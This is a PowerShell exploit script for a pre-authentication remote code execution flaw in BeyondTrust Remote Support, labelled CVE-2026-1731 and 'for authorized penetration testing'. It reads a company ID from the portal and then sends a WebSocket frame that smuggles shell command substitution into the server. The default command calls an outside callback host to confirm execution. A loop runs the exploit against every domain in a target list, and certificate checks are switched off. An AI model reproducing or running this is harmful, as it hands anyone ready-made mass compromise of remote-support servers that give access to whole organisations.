<#
.SYNOPSIS
    BeyondTrust Remote Support Pre-auth RCE (CVE-2026-1731) - Native PowerShell Port
    For authorized penetration testing and red-teaming only.
#>

# 1. Global Session Configuration
# Ignore all SSL/TLS certificate errors
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
# Ensure compatibility with multiple TLS versions
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls13

Function Invoke-BTExploit {
    Param(
        [Parameter(Mandatory=$true)]
        [string]$Target,
        [string]$Command = "nslookup XXXXXXXXXXXXXXXXXXX.oast.fun"
    )

    Write-Host "`n[*] Target: $Target" -ForegroundColor Cyan

    # 2. Reconnaissance (HTTP)
    $PortalUrl = "https://$Target/get_portal_info"
    try {
        $Resp = Invoke-WebRequest -Uri $PortalUrl -UseBasicParsing -TimeoutSec 5
        if ($Resp.Content -match "company=([^;]+)") {
            $Company = $Matches[1].Trim()
            Write-Host "[+] Found Company: $Company" -ForegroundColor Green
        } else {
            Write-Host "[-] Could not extract Company ID." -ForegroundColor Yellow
            return
        }
    } catch {
        Write-Host "[-] Failed to reach portal info endpoint." -ForegroundColor Red
        return
    }

    # 3. WebSocket Setup
    $WS = New-Object System.Net.WebSockets.ClientWebSocket
    $WS.Options.AddSubProtocol("ingredi support desk customer thin")
    $WS.Options.SetRequestHeader("X-Ns-Company", $Company)
    
    $Uri = New-Object System.Uri("wss://$Target/nw")
    $CTS = New-Object System.Threading.CancellationTokenSource(10000) # 10s Timeout

    try {
        $WS.ConnectAsync($Uri, $CTS.Token).Wait()
        if ($WS.State -eq 'Open') {
            Write-Host "[*] Connection Open. Sending Payload..." -ForegroundColor Gray

            # 4. Binary Payload Construction
            # Replicating bit-for-bit: hax[$(CMD)]\nUUID\n0\naaaa\n
            $LF = [byte]0x0A
            $Enc = [System.Text.Encoding]::ASCII
            
            $Payload = $Enc.GetBytes("hax[`$($Command)]") + $LF + 
                       $Enc.GetBytes("aaaaaaaa-aaaa-aaaa-aaaaaaaaaaaa") + $LF + 
                       $Enc.GetBytes("0") + $LF + 
                       $Enc.GetBytes("aaaa") + $LF

            $Segment = New-Object System.ArraySegment[byte] -ArgumentList @(,$Payload)

            # Send as Binary Frame
            $WS.SendAsync($Segment, [System.Net.WebSockets.WebSocketMessageType]::Binary, $true, $CTS.Token).Wait()
            Write-Host "[+] Payload transmitted." -ForegroundColor Green

            # 5. Response Listener
            $Buffer = New-Object byte[] 4096
            $RcvSegment = New-Object System.ArraySegment[byte] -ArgumentList @(,$Buffer)
            
            # Wait up to 3 seconds for stdout/stderr feedback
            $RcvTask = $WS.ReceiveAsync($RcvSegment, $CTS.Token)
            if ($RcvTask.Wait(3000)) {
                $Result = $Enc.GetString($Buffer, 0, $RcvTask.Result.Count)
                if ($Result.Trim()) {
                    Write-Host "[!] Response Received:" -ForegroundColor Yellow
                    Write-Output $Result
                }
            }
        }
    } catch {
        Write-Host "[-] WebSocket Error: $($_.Exception.InnerException.Message)" -ForegroundColor Red
    } finally {
        $WS.Dispose()
    }
}

# 6. Bulk Processing Loop
$DomainFile = "domains.txt"
if (Test-Path $DomainFile) {
    $Domains = Get-Content $DomainFile
    foreach ($Domain in $Domains) {
        if ($Domain.Trim()) {
            Invoke-BTExploit -Target $Domain.Trim()
        }
    }
} else {
    Write-Host "[!] Please create 'domains.txt' with one target per line." -ForegroundColor Red
}